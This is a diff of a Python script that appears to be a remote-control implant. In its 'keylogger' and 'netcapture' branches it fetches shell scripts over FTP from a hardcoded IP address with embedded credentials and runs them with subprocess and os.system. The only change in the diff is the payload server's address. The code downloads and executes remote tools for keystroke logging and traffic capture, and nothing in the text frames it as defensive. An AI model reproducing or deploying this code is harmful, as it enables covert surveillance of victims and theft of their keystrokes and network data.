@@ -61,7 +61,7 @@ def main():
             
         elif cmd == 'keylogger':
             if action == 'clean':
-                action = ['wget -q ftp://siic:azerty@84.39.49.25/keylogger/clean_keylogger.sh', 'sh clean_keylogger.sh']
+                action = ['wget -q ftp://siic:azerty@84.39.40.23/keylogger/clean_keylogger.sh', 'sh clean_keylogger.sh']
                 for i in range(len(action)):
                     results = subprocess.Popen(action[i], shell=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -87,7 +87,7 @@ def main():
                 results = results.stdout.read() + results.stderr.read()
 
             elif action == 'install':
-                action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.49.25/keylogger/*']
+                action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.40.23/keylogger/*']
                 for i in range(len(action)):
                     results = subprocess.Popen(action[i], shell=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -99,7 +99,7 @@ def main():
 
         elif cmd == 'netcapture':
             if action == 'start':
-                action = 'wget -r -q --no-parent -nH ftp://siic:azerty@84.39.49.25/netcapture/netcapture.sh'
+                action = 'wget -r -q --no-parent -nH ftp://siic:azerty@84.39.40.23/netcapture/netcapture.sh'
                 results = subprocess.Popen(action, shell=True,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
@@ -107,7 +107,7 @@ def main():
                 os.system("sh netcapture/netcapture.sh &")
                 
             elif action == 'stop':
-                action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.49.25/netcapture/netcapture_stop.sh', '. netcapture/netcapture_stop.sh']
+                action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.40.23/netcapture/netcapture_stop.sh', '. netcapture/netcapture_stop.sh']
                 for i in range(len(action)):
                     results = subprocess.Popen(action[i], shell=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
